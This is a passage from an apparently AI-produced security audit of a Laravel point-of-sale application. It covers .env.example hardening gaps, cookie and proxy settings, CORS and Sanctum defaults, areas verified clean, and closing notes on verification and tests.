it, and nothing guarantees that retention.

**Suggested fix.** Add `price_overridden_by_user_id` to `sale_lines` and copy it in
`CompleteSaleAction`, alongside an `activity()` entry per 8-H2.

---

### 8-M2 · MEDIUM · `.env.example` ships a debug profile, a populated `APP_KEY`, and omits every hardening key

| Field | Content |
|---|---|
| **Severity** | Medium |
| **Location** | [.env.example:2-4](.env.example#L2-L4), [.env.example:21](.env.example#L21), [config/session.php:172](config/session.php#L172) |

**What's wrong.** Four related issues in the deployment template. (No secret value is reproduced
here; `.env` itself was never read.)

- `APP_ENV=local`, `APP_DEBUG=true`, `LOG_LEVEL=debug`. These are skeleton defaults, but combined
  with the exception config they are the difference between a 500 page and a full stack trace with
  DB credentials in the frame arguments.
- **`APP_KEY` is populated rather than the stock empty `APP_KEY=`** — the line carries a concrete
  `base64:` value (50 characters, verified non-empty without printing it). A deployer who copies the
  example and forgets to run `key:generate` inherits a key that is public in the repository, making
  every signed URL, encrypted cookie and `Crypt::` payload in that deployment forgeable by anyone who
  can read the repo. `git ls-files` confirms only `.env.example` is tracked and `.gitignore` correctly
  excludes `.env` — the real secret is safe; the risk is purely the inherited example key.
- **`SESSION_SECURE_COOKIE` is absent from the example and has no default in config** —
  `'secure' => env('SESSION_SECURE_COOKIE')` resolves to `null`, i.e. "secure only if the request is
  HTTPS". Behind a TLS-terminating proxy `$request->isSecure()` is `false`, so **the session cookie
  ships without the `Secure` flag on a site users believe is HTTPS-only.**
- **No trusted proxies are configured** (`grep -rn "trustProxies\|TrustProxies" bootstrap/ app/`
  returns nothing). This both causes the `Secure`-flag problem above and collapses the login
  limiter's `$request->ip()` to the proxy address — putting every user in one 5/min bucket
  (self-DoS) while defeating per-attacker throttling.

**Why it matters.** Each is a one-line omission, but together they describe a deployment that leaks
stack traces, may ship a forgeable app key, and sends its session cookie in the clear behind a load
balancer.

**Suggested fix.** Blank the `APP_KEY` line in the example; set `APP_ENV=production`,
`APP_DEBUG=false`, `LOG_LEVEL=warning` as the template defaults; add `SESSION_SECURE_COOKIE=true` and
`SANCTUM_STATEFUL_DOMAINS`; and configure `trustProxies` in `bootstrap/app.php`.

---

### 8-L1 · LOW · CORS and Sanctum stateful domains sit at framework defaults

| Field | Content |
|---|---|
| **Severity** | Low |
| **Location** | `config/cors.php` (absent), [config/sanctum.php:21-26](config/sanctum.php#L21-L26) |

**What's wrong.** There is no `config/cors.php` in the project (confirmed by listing `config/`), so
the framework default applies: `allowed_origins => ['*']` with **`supports_credentials => false`**.
Separately, `SANCTUM_STATEFUL_DOMAINS` appears nowhere in `.env.example`, so a deployer copying the
example ships production with `localhost, localhost:3000, 127.0.0.1, 127.0.0.1:8000, ::1` in the
stateful list.

**Why it matters — and why this is Low.** The exploitable combination is a wildcard origin **plus**
credentials, and `supports_credentials` is `false`. The API is pure Bearer-token, so the wildcard does
not by itself leak an authenticated response. Likewise the stale stateful list is currently **inert**,
because `bootstrap/app.php` never calls `statefulApi()`, so `EnsureFrontendRequestsAreStateful` is not
in the `api` group at all. Both become live the moment someone enables SPA cookie auth — which is
exactly the kind of change made without revisiting CORS.

**Suggested fix.** Publish `config/cors.php` with an env-driven `allowed_origins`, and add
`SANCTUM_STATEFUL_DOMAINS` to `.env.example`, so neither can be silently paired with a future
credentials change.

## Suspected

### 8-S1 · Unconditional JSON exception renderers may break Livewire error handling

[bootstrap/app.php:39-53](bootstrap/app.php#L39-L53) registers `render()` closures for seven domain
exception types (`CheckoutException`, `ShiftException`, `IdempotencyConflictException`,
`GiftcardException`, `LoyaltyException`, `PrintingException`, `KitchenPrintingException`) that are
**unconditional** — they do not check `$request->expectsJson()`, even though
`shouldRenderJsonWhen(...)` is configured separately. A `CheckoutException` or `GiftcardException`
raised from a **Livewire** back-office component would therefore be converted to a bare
`application/json` 422 rather than a Livewire-shaped response. Most such paths already catch locally
and route to `DomainLog::refused()` (23 call sites), so this is likely latent rather than live —
worth a targeted test. Correctness, not security.

## Area 8 — verified clean

- **No unauthenticated document exposure — an attacker cannot fetch another sale's receipt or invoice PDF by guessing an ID or filename.** Three independent reasons: PDFs are **never written to disk** (both `SaleReceiptController` and `SupplierInvoicePdfController` build and `stream()` on demand, so there is no file to guess); each controller calls `Gate::authorize('view', …)` **in its own body in addition to** the route's `auth` + `permission:` middleware, so the check survives a route restructure; and all 12 report exports likewise stream behind `permission:reports.view` plus a per-report permission.
- **The only `Storage` write in the entire app is the business logo** — `$this->logo->store('branding', 'public')` behind `permission:config.manage`, using `store()` rather than `storeAs()`, so the filename is a random 40-character hash rather than anything guessable, and a store logo is public by design. `storage/app/private` and `storage/app/public` are both empty, `public/` has no `storage` symlink, and the default disk is `local` → `storage_path('app/private')`.
- **The CSV import file is never persisted** — `Import.php` reads the Livewire temp file directly via `getRealPath()` and never moves it onto a web-reachable disk.
- **No catch-all exception message leakage to API clients.** The seven registered renderers each return a deliberate, non-sensitive domain message; there is no generic `render()` echoing `$e->getMessage()`, so a `QueryException` will not leak SQL. Generic-exception behaviour falls back to the framework default governed by `APP_DEBUG` — which is why 8-M2 is the operative control.
- **Session cookie flags are otherwise sound** — `http_only` defaults to `true` and `same_site` to `'lax'`; only the `secure` flag lacks a default (8-M2).
- **`.env` is correctly gitignored**; only `.env.example` is tracked.
- **Sanctum token expiry is configured** at 24 hours rather than Laravel's stock `null` (never expires).

---

# Closing notes

**Scope covered.** All eight audit areas were worked. Findings were produced by seven parallel
subagent sweeps, then every claim cited above was re-read against the source before inclusion;
leads that did not survive that check were dropped or demoted to *Suspected*.

**Two corrections made during verification**, both worth recording because they cut the other way
from the initial signal:

1. The "23 `lockForUpdate` calls are no-ops on SQLite" lead was demoted from Critical to
   [1-L1](#1-l1--low--configdatabasephp-defaults-to-sqlite-where-lockforupdate-compiles-to-nothing)
   after confirming both `.env.example` and `phpunit.xml` pin `DB_CONNECTION=mysql`.
2. The "~71 debug statements" figure was wrong — a regex artefact. The real count is **zero**.

**Tests.** `npm run test` passes: `Test Files 5 passed (5) / Tests 68 passed (68)`, exit 0.
`php artisan test` was **not** run — it requires a live MySQL database (`phpunit.xml` sets
`DB_DATABASE=pos_testing`), and no hypothesis in this audit depended on it. No failing test was
observed, and none was modified.

**What the codebase gets right**, since a list of defects alone would misrepresent it: the server
never trusts client-supplied totals; there is no client clock in the trust boundary at all; there is
no SQL injection, no XSS sink, no command injection, and no unauthenticated file exposure; 66 of 71
Livewire components authorize correctly; every route resolves; there are no orphaned `wire:click`
handlers, no dead actions, and no debug leftovers. The serious problems are concentrated in
financial edge cases (inclusive tax, unclamped discounts, proration rounding), the offline queue's
error handling, and location scoping — not in the basics.
